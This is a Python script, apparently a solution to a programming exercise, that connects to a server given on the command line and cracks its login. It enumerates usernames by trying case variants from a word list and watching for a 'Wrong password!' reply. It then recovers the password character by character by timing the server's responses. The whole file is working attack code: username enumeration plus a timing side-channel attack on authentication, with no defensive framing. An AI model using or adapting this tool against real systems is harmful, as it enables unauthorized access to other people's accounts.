import socket, sys, itertools, json, string, datetime


def hack_case(word):
    yield word
    for r in range(1, len(word) + 1):
        for up in itertools.combinations(range(len(word)), r=r):
            yield ''.join([lt.upper() if i in up and not lt.isdigit() else lt for i, lt in enumerate(word)])


def next_symbol():
    yield from itertools.cycle(string.digits + string.ascii_letters)


def send(sock, message):
    sock.send(message.encode())
    start_time = datetime.datetime.now()
    response = sock.recv(1024).decode()
    finish_time = datetime.datetime.now()
    return response, (finish_time - start_time) / datetime.timedelta(microseconds=1)


with socket.socket() as client_socket:
    client_socket.connect((sys.argv[1], int(sys.argv[2])))
    good_login, password, delays = '', '', []
    with open('logins.txt', 'r') as file:
        for line in file:     # Login finding
            for login in hack_case(line.strip()):
                json_auth = json.dumps({"login": login, "password": password + ' '})
                resp, delay = send(client_socket, json_auth)
                dict_answer = json.loads(resp)
                delays.append(delay)
                if dict_answer['result'] == 'Wrong password!':
                    good_login = login
                    break
            if good_login:
                break

    max_delay = max(delays)
    for next_symbol in next_symbol():     # Password finding
        new_password = password + next_symbol
        json_auth = json.dumps({'login': good_login, 'password': new_password})
        resp, delay = send(client_socket, json_auth)
        dict_answer = json.loads(resp)
        if dict_answer['result'] == 'Connection success!':
            print(json_auth)
            break
        if dict_answer['result'] == 'Wrong password!' and delay > max_delay:
            password = new_password
